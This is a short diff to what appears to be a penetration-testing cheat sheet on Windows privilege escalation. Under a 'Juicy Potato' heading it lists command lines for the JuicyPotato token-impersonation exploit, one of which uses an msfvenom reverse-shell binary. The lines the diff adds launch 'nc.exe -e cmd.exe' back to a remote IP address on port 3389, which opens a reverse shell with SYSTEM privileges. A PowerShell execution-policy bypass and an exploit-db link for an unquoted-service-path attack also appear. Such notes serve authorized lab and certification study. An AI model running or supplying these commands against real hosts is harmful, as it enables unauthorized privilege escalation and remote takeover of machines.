@@ -417,6 +417,8 @@ or
 ### Juicy Potato
 > 1. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c .\GetCLSID.ps1
 > 1. JuicyPotato.exe -l 10444 -p reverse_shell_msf_venom.exe -t * -c {F2886130-0941-44EB-9335-985BA6EF1ACE}
+> 1. *Windows Server 2012 R2 Standard* jp86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 192.168.119.174 3389" -t *
+> 1. jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 192.168.119.174 3389" -t *
 
 ### PrivEsc Windows via Unquoted Service Path
 > 1. e.g ---> Bootp Turbo ---> https://www.exploit-db.com/exploits/49851
